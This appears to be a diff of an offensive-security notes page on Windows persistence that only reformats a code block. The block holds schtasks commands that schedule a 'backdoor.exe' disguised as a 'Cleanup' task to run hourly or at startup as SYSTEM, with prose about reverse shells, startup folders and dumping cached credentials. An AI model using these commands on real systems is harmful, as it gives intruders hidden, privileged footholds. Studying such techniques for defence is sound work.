@@ -21,12 +21,11 @@ This later allows you to log in as that user and dump cached creds like [#post-e
 
 Another method is creating a scheduled task that executes hourly or in another period and runs a program that gives you a reverse shell, for example.&#x20;
 
-```powershell
-# Run every 1 hour
-schtasks /create /sc HOURLY /mo 1 /tn "Cleanup" /tr "C:\Windows\Tasks\backdoor.exe"
-# Run on startup, as the SYSTEM user
-schtasks /create /sc ONSTART /tn "Cleanup" /ru "SYSTEM" /tr "C:\Windows\Tasks\backdoor.exe"
-```
+<pre class="language-powershell"><code class="lang-powershell"># Run every 1 hour
+<strong>schtasks /create /sc HOURLY /mo 1 /tn "Cleanup" /tr "C:\Windows\Tasks\backdoor.exe"
+</strong># Run on startup, as the SYSTEM user
+<strong>schtasks /create /sc ONSTART /tn "Cleanup" /ru "SYSTEM" /tr "C:\Windows\Tasks\backdoor.exe"
+</strong></code></pre>
 
 Then another classic is Autoruns, programs that register themselves to start on startup. You can place binaries or scripts in the following `shell:startup` directory, and they will execute on startup:
 
